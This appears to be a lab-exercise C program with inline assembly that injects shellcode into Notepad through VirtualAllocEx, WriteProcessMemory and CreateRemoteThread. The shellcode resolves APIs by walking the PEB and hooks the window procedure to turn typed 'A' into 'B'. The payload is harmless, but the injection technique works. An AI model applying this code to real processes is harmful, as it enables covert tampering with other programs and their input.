#include <windows.h>
#include <stdio.h>
#pragma comment(lib,"user32.lib")
DWORD 			dwSizeOfCode;
PBYTE 			pCode, pOrignCode;
HWND        hMainWnd, hWnd;
DWORD       pid;
void 		_hWnd();
void 		_old();
void 		_callWPA();
DWORD  	__stdcall NewProc();

__declspec(naked) void code_start()
{
    __asm 
    { 
        
        push    ebp
        mov     ebp, esp
// ebp-0x04 ====> hmodkern32
// ebp-0x08 ====> dwAddrOfGetProcAddress
// ebp-0x0C ====> dwAddrOfLoadLibraryA
// ebp-0x10 ====> hmoduser32
// ebp-0x14 ====> dwAddrOfSetWindowLongA
// ebp-0x18 ====> dwAddrOfGetModuleHandleA
        sub     esp, 0x20
//hmodkern32 = _GetBaseKernel32();
        call    _GetBaseKernel32
        mov     [ebp - 0x04], eax // save Base Address of "Kernel32.dll"
//dwAddrOfGetProcAddress = _GetGetProcAddrBase(hmodkern32);
        push    eax
        call    _GetGetProcAddrBase
        mov     [ebp - 0x08], eax  // save GetProcAddress
        add     esp, 0x04
        call    _delta
_delta:
        pop     ebx                         // save registers context from stack
        sub     ebx, offset _delta

// dwAddrOfLoadLibraryA = GetProcAddress(hmodkern32, "LoadLibraryA")
        lea     ecx, [ebx + _str_lla]
        push    ecx
        push    [ebp - 0x04]
        call    dword ptr [ebp - 0x08]
        mov     [ebp - 0x0C], eax

// hmoduser32 = LoadLibraryA("user32.dll");
        lea     ecx, [ebx + _str_u32]
        push    ecx
        call    dword ptr [ebp - 0x0C]
        mov     [ebp-0x10], eax

// dwAddrOfSetWindowLongA = GetProcAddress(hmoduser32, "SetWindowLongA");
        lea     ecx, [ebx + _str_swla]
        push    ecx
        push    dword ptr [ebp-0x10]
        call    dword ptr [ebp-0x08]
        mov     [ebp-0x14], eax
// dwAddrOfCallWindowProcA = GetProcAddress(hmoduser32, "CallWindowProcA");
        lea     ecx, [ebx + _str_cwpa]
        push    ecx
        push    dword ptr [ebp-0x10]
        call    dword ptr [ebp-0x08]
        mov     [ebp-0x18], eax
        mov dword ptr [ebx+_callWPA],eax
        

// SetWindowLongA(HWND hWnd, int nIndex, LONG dwNewLong)
        lea ecx , [ebx+_newproc]
        push ecx
        push -4
        mov ecx,dword ptr [ebx+_hWnd]
        push ecx
        call    dword ptr [ebp-0x14]
        mov dword ptr [ebx+_old],eax
        
				mov     esp, ebp
        pop     ebp 
		
				ret  
        
// ---------------------------------------------------------
// type : DWORD GetBaseKernel32()
_GetBaseKernel32:
        push    ebp
        mov     ebp, esp
        push    esi
        push    edi
        xor     ecx, ecx                    // ECX = 0
        mov     esi, fs:[0x30]              // ESI = &(PEB) ([FS:0x30])
        mov     esi, [esi + 0x0c]           // ESI = PEB->Ldr
        mov     esi, [esi + 0x1c]           // ESI = PEB->Ldr.InInitOrder
_next_module:
        mov     eax, [esi + 0x08]           // EBP = InInitOrder[X].base_address
        mov     edi, [esi + 0x20]           // EBP = InInitOrder[X].module_name (unicode)
        mov     esi, [esi]                  // ESI = InInitOrder[X].flink (next module)
        cmp     [edi + 12*2], cx            // modulename[12] == 0 ?
        jne     _next_module                 // No: try next module.
        pop     edi
        pop     esi
        mov     esp, ebp
        pop     ebp
        ret
// ---------------------------------------------------------
// type : DWORD GetGetProcAddrBase(DWORD base)
_GetGetProcAddrBase:
        push    ebp
        mov     ebp, esp
        push    edx
        push    ebx
        push    edi
        push    esi

        mov     ebx, [ebp+8]
        mov     eax, [ebx + 0x3c] // edi = BaseAddr, eax = pNtHeader
        mov     edx, [ebx + eax + 0x78]
        add     edx, ebx          // edx = Export Table (RVA)
        mov     ecx, [edx + 0x18] // ecx = NumberOfNames
        mov     edi, [edx + 0x20] //
        add     edi, ebx          // ebx = AddressOfNames

_search:
        dec     ecx
        mov     esi, [edi + ecx*4]
        add     esi, ebx
        mov     eax, 0x50746547 // "PteG"
        cmp     [esi], eax
        jne     _search
        mov     eax, 0x41636f72 //"Acor"
        cmp     [esi+4], eax
        jne     _search

        mov     edi, [edx + 0x24] //
        add     edi, ebx      // edi = AddressOfNameOrdinals
        mov     cx, word ptr [edi + ecx*2]  // ecx = GetProcAddress-orinal
        mov     edi, [edx + 0x1c] //
        add     edi, ebx      // edi = AddressOfFunction
        mov     eax, [edi + ecx*4]
        add     eax, ebx      // eax = GetProcAddress
        
        pop     esi
        pop     edi
        pop     ebx
        pop     edx
        
        mov     esp, ebp
        pop     ebp
        ret

_newproc:
        push    ebp
        mov     ebp,esp
        push    ebx
        push    esi
        push    edi
        call    _delta2
_delta2:
        pop     ebx
        sub     ebx,    offset _delta2 					// 自定位
        mov     ecx,    dword ptr [ebp + 0x0C]  // ecx <- uMsg
        mov     edx,    dword ptr [ebp + 0x10]  // edx <- wParam
        mov     edi,    dword ptr [ebp + 0x14]  // edi <- lParam
_cont0:
        cmp     ecx,    WM_CHAR
        jne     _contn
        cmp     edx,    'A'
        jne     _contn
        mov     edx,    'B'
_contn:
        push    edi
        push    edx
        push    ecx
       // 在这里填入代码，调用旧的消息处理函数
       //LRESULT CallWindowProc(WNDPROC lpPrevWndFunc, HWND hWnd, UINT Msg, WPARAM wParam, LPARAM IParam);
       	mov ecx ,dword ptr [ebx+_hWnd]
       	push ecx
       	mov eax,dword ptr [ebx+_old]
       	push eax
       	mov eax ,dword ptr [ebx+_callWPA]
        call    eax
        
_ret2:
        pop     edi
        pop     esi
        pop     ebx
        mov     esp, ebp
        pop     ebp
        ret     0x10
_str_lla:
        _emit   'L'
        _emit   'o'
        _emit   'a'
        _emit   'd'
        _emit   'L'
        _emit   'i'
        _emit   'b'
        _emit   'r'
        _emit   'a'
        _emit   'r'
        _emit   'y'
        _emit   'A'
        _emit   0x0
_str_u32:
        _emit   'u'
        _emit   's'
        _emit   'e'
        _emit   'r'
        _emit   '3'
        _emit   '2'
        _emit   '.'
        _emit   'd'
        _emit   'l'
        _emit   'l'
        _emit   0x0
_str_swla:
				_emit   'S'
        _emit   'e'
        _emit   't'
        _emit   'W'
        _emit   'i'
        _emit   'n'
        _emit   'd'
        _emit   'o'
        _emit   'w'
        _emit   'L'
        _emit   'o'
        _emit   'n'
        _emit   'g'
        _emit   'A'
        _emit   0x0 
_str_cwpa:
				_emit   'C'
        _emit   'a'
        _emit   'l'
        _emit   'l'
        _emit   'W'
        _emit   'i'
        _emit   'n'
        _emit   'd'
        _emit   'o'
        _emit   'w'
        _emit   'P'
        _emit   'r'
        _emit   'o'
        _emit   'c'
        _emit   'A'
        _emit   0x0 
_str_gmha:
        _emit   'G'
        _emit   'e'
        _emit   't'
        _emit   'M'
        _emit   'o'
        _emit   'd'
        _emit   'u'
        _emit   'l'
        _emit   'e'
        _emit   'H'
        _emit   'a'
        _emit   'n'
        _emit   'd'
        _emit   'l'
        _emit   'e'
        _emit   'A'
        _emit   0x0 
_str_hello:
        _emit   'I'
        _emit   '\''
        _emit   'm'
        _emit   ' '
        _emit   'h'
        _emit   'a'
        _emit   'c'
        _emit   'k'
        _emit   'e'
        _emit   'd'
        _emit   '!'
_str_emp:
        _emit   0x0
        
  }
}
__declspec(naked) void _old()
{
    __asm {
        _emit   0xCC
        _emit   0xCC
        _emit   0xCC
        _emit   0xCC
    }
}
__declspec(naked) void _callWPA()
{
    __asm {
        _emit   0xCC
        _emit   0xCC
        _emit   0xCC
        _emit   0xCC
    }
}
__declspec(naked) void _hWnd()
{
    __asm {
        _emit   0xCC
        _emit   0xCC
        _emit   0xCC
        _emit   0xCC
    }
}

               	
__declspec(naked) void code_end()
{
    __asm _emit 0xCC
}

DWORD make_code()
{
    int off; 
    __asm {
        mov edx, offset code_start
        mov dword ptr [pOrignCode], edx
        mov eax, offset code_end
        sub eax, edx
        mov dword ptr [dwSizeOfCode], eax
    }
    pCode = VirtualAlloc(NULL, dwSizeOfCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pCode== NULL) {
        printf("[E]: VirtualAlloc failed\n");
        return 0;
    }
    printf("[I]: VirtualAlloc ok --> at 0x%08x.\n", pCode);
    for (off = 0; off<dwSizeOfCode; off++) {
        *(pCode+off) = *(pOrignCode+off);
    }
    printf("[I]: Copy code ok --> from 0x%08x to 0x%08x with size of 0x%08x.\n", 
        pOrignCode, pCode, dwSizeOfCode);
    off = (DWORD)pCode - (DWORD)pOrignCode;
    *(PDWORD)((PBYTE)_hWnd + off) = hWnd;//填入hWnd
    printf("Fill hWnd Success!\n");
    return dwSizeOfCode;
}

int main()
{
    //DWORD pid = 0;
		DWORD sizeOfInjectedCode;
		DWORD addrOldWindowFunction;
		int TID,num,old;
		PBYTE rcode;
		DWORD hproc,hthread;
		
    hMainWnd = FindWindow ("notepad", NULL);
    hWnd = GetWindow(hMainWnd, GW_CHILD);
    GetWindowThreadProcessId(hWnd, &pid);
    
    printf("Get PID Success! The pid of NotePad is %d\n",pid);
    printf("Get hWnd Success! The handle of window is 0x%08x\n",hWnd);
    
		sizeOfInjectedCode=make_code();//将代码编译并拷贝入新的区域，返回代码长度
    hproc = OpenProcess(
          PROCESS_CREATE_THREAD  | PROCESS_QUERY_INFORMATION
        | PROCESS_VM_OPERATION   | PROCESS_VM_WRITE 
        | PROCESS_VM_READ, FALSE, pid);//创建远程进程句柄
        
    rcode=(PBYTE)VirtualAllocEx(hproc,0,sizeOfInjectedCode,MEM_COMMIT,PAGE_EXECUTE_READWRITE);//open the space in remote process
		if(!WriteProcessMemory(hproc, rcode, pCode, sizeOfInjectedCode, &num)){//写入代码
			printf("[E]Write pCode Failed\n");
			}else 
			{
			printf("[I]Write pCode Success\n");
			}
		hthread = CreateRemoteThread(hproc,NULL, 0, (LPTHREAD_START_ROUTINE)rcode,0, 0 , &TID);//创建线程
		WaitForSingleObject(hthread, 0xffffffff);//异步等待
		if(!GetExitCodeThread(hthread, &addrOldWindowFunction)){//获取返回值
  		printf("[E]Get exitCode Failed\n");
  		}else 
  		{
  		printf("[I]Get exitCode Success\n");
  		}
		printf("The address of OldWindowFunction is 0x%08x\n",addrOldWindowFunction);//打印
}